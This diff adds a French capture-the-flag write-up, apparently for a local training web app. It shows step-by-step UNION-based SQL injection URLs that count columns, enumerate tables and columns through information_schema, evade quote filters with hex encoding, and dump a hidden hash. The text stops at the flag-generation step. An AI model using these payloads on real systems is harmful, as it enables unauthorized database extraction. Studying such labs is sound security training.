@@ -1,0 +1,26 @@
+1. Déterminer le nombre de colonnes
+URL : http://localhost:8080/?page=searchimg&id=5 ORDER BY 2&Submit=Submit
+Conclusion : La table possède 2 colonnes.
+
+2. Identifier les points d'affichage
+On vérifie où les données injectées apparaissent dans le HTML.
+URL : http://localhost:8080/?page=searchimg&id=999 UNION SELECT 1,2&Submit=Submit
+Conclusion : La colonne 1 s'affiche dans "Url" et la colonne 2 dans "Title".
+
+3. Lister les tables de la base de données
+On interroge le dictionnaire interne de SQL pour trouver les noms des tables.
+URL : http://localhost:8080/?page=searchimg&id=999 UNION SELECT 1, group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()&Submit=Submit
+Résultat : Title: list_images.
+
+4. Lister les colonnes de la table trouvée
+Pour éviter les filtres sur les guillemets ('), on convertit le nom de la table list_images en hexadécimal (0x6c6973745f696d61676573).
+URL : http://localhost:8080/?page=searchimg&id=999 UNION SELECT 1, group_concat(column_name) FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573&Submit=Submit
+Résultat : Title: id,url,title,comment.
+
+5. Extraire les données des colonnes
+URL : http://localhost:8080/?page=searchimg&id=999 UNION SELECT group_concat(title), group_concat(comment) FROM list_images&Submit=Submit
+Résultat : Récupération de l'indice dans la table comment : 1928e8083cf461a51303633093573c46.
+
+6. Générer le Flag final (Bash)
+Une fois le hash MD5 décodé (qui donne albatroz), on génère le flag définitif en SHA-256
+
